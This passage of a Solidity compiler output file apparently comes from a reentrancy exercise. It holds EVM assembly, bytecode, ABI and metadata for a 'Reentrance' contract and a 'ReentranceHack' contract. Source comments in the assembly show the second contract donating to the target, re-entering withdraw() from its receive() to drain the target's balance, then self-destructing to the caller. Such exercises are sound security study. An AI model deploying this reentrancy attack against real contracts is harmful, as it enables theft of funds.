											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 576,
											"end": 580,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 567,
											"end": 581,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 567,
											"end": 581,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 567,
											"end": 581,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 567,
											"end": 581,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 567,
											"end": 581,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 567,
											"end": 581,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 560,
											"end": 581,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 560,
											"end": 581,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 486,
											"end": 586,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 925,
											"end": 932,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 944,
											"end": 953,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 960,
											"end": 961,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 956,
											"end": 957,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 956,
											"end": 961,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 944,
											"end": 961,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 944,
											"end": 961,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 984,
											"end": 985,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 979,
											"end": 980,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 979,
											"end": 985,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 979,
											"end": 985,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "1B"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1035,
											"end": 1036,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"balances(address)": "27e235e3",
							"donate(address)": "00362a95",
							"withdraw(uint256)": "2e1a7d4d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"donate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Reentrance.sol\":\"Reentrance\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Reentrance.sol\":{\"keccak256\":\"0x316fb3e7bf686bd45d60e8985e443950af21dcc6f39cc81b4c75470bc97abc3e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8ca71ff1998a2225a347cbca517c69e19cdcde609b99265ecabda937412f1448\",\"dweb:/ipfs/QmQnz8ubTthQvPxvPe2BnLpShzFBU5YyGWn3EoW452uVkD\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":{\"keccak256\":\"0x6c234834003dfb86e2c23d12dfdde7cc01e78013d71b52162cb308b4873562cb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f0e3f39b2ec26694a42c89a5d9e489d5228f1880fcf5e375c5c975ba816e5ffe\",\"dweb:/ipfs/QmUErheHopnbBUSLDQAtWsmw6HsEvqTNp1QiBEuSJhmhHn\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 10,
								"contract": "contracts/Reentrance.sol:Reentrance",
								"label": "balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"ReentranceHack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "_reentrance",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Reentrance.sol\":861:1370  contract ReentranceHack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Reentrance.sol\":924:1019  constructor(address payable _reentrance) public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contracts/Reentrance.sol\":1002:1013  _reentrance */\n  dup1\n    /* \"contracts/Reentrance.sol\":978:988  reentrance */\n  0x00\n  dup1\n    /* \"contracts/Reentrance.sol\":978:1014  reentrance = Reentrance(_reentrance) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Reentrance.sol\":924:1019  constructor(address payable _reentrance) public {... */\n  pop\n    /* \"contracts/Reentrance.sol\":861:1370  contract ReentranceHack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Reentrance.sol\":861:1370  contract ReentranceHack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/Reentrance.sol\":1230:1245  uint256 balance */\n      0x00\n        /* \"contracts/Reentrance.sol\":1248:1296  Math.min(address(reentrance).balance, msg.value) */\n      tag_6\n        /* \"contracts/Reentrance.sol\":1265:1275  reentrance */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":1257:1284  address(reentrance).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/Reentrance.sol\":1286:1295  msg.value */\n      callvalue\n        /* \"contracts/Reentrance.sol\":1248:1256  Math.min */\n      tag_7\n        /* \"contracts/Reentrance.sol\":1248:1296  Math.min(address(reentrance).balance, msg.value) */\n      jump\t// in\n    tag_6:\n        /* \"contracts/Reentrance.sol\":1230:1296  uint256 balance = Math.min(address(reentrance).balance, msg.value) */\n      swap1\n      pop\n        /* \"contracts/Reentrance.sol\":1317:1318  0 */\n      0x00\n        /* \"contracts/Reentrance.sol\":1307:1314  balance */\n      dup2\n        /* \"contracts/Reentrance.sol\":1307:1318  balance > 0 */\n      gt\n        /* \"contracts/Reentrance.sol\":1302:1364  if ( balance > 0 ) {... */\n      iszero\n      tag_8\n      jumpi\n        /* \"contracts/Reentrance.sol\":1329:1339  reentrance */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":1329:1348  reentrance.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contracts/Reentrance.sol\":1349:1356  balance */\n      dup3\n        /* \"contracts/Reentrance.sol\":1329:1357  reentrance.withdraw(balance) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrance.sol\":1302:1364  if ( balance > 0 ) {... */\n    tag_8:\n        /* \"contracts/Reentrance.sol\":1197:1368  receive() external payable {... */\n      pop\n        /* \"contracts/Reentrance.sol\":861:1370  contract ReentranceHack {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Reentrance.sol\":1023:1193  function attack() public payable {... */\n    tag_3:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":391:495  function min(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_7:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":449:456  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":479:480  b */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":475:476  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":475:480  a < b */\n      lt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":475:488  a < b ? a : b */\n      tag_15\n      jumpi\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":487:488  b */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":475:488  a < b ? a : b */\n      jump(tag_16)\n    tag_15:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":483:484  a */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":475:488  a < b ? a : b */\n    tag_16:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":468:488  return a < b ? a : b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol\":391:495  function min(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":1023:1193  function attack() public payable {... */\n    tag_13:\n        /* \"contracts/Reentrance.sol\":1062:1072  reentrance */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":1062:1079  reentrance.donate */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x362a95\n        /* \"contracts/Reentrance.sol\":1087:1096  msg.value */\n      callvalue\n        /* \"contracts/Reentrance.sol\":1106:1110  this */\n      address\n        /* \"contracts/Reentrance.sol\":1062:1112  reentrance.donate{value: msg.value}(address(this)) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrance.sol\":1118:1128  reentrance */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":1118:1137  reentrance.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contracts/Reentrance.sol\":1138:1147  msg.value */\n      callvalue\n        /* \"contracts/Reentrance.sol\":1118:1148  reentrance.withdraw(msg.value) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Reentrance.sol\":1176:1186  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":1155:1188  selfdestruct(payable(msg.sender)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n\n    auxdata: 0xa26469706673582212203954f8be6c8fff504c368c0e7bf7f08ddeaf368971577b17d9fde49e520db43b64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161033b38038061033b8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102a7806100946000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461010957610104565b3661010457600061006a60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163134610113565b905060008111156101015760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100e857600080fd5b505af11580156100fc573d6000803e3d6000fd5b505050505b50005b600080fd5b61011161012c565b005b60008183106101225781610124565b825b905092915050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a9534306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b1580156101b457600080fd5b505af11580156101c8573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561024057600080fd5b505af1158015610254573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212203954f8be6c8fff504c368c0e7bf7f08ddeaf368971577b17d9fde49e520db43b64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x33B CODESIZE SUB DUP1 PUSH2 0x33B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x2A7 DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x109 JUMPI PUSH2 0x104 JUMP JUMPDEST CALLDATASIZE PUSH2 0x104 JUMPI PUSH1 0x0 PUSH2 0x6A PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE CALLVALUE PUSH2 0x113 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x101 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x111 PUSH2 0x12C JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x122 JUMPI DUP2 PUSH2 0x124 JUMP JUMPDEST DUP3 JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 CALLVALUE ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x254 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY SLOAD 0xF8 0xBE PUSH13 0x8FFF504C368C0E7BF7F08DDEAF CALLDATASIZE DUP10 PUSH18 0x577B17D9FDE49E520DB43B64736F6C634300 MOD 0xC STOP CALLER ",
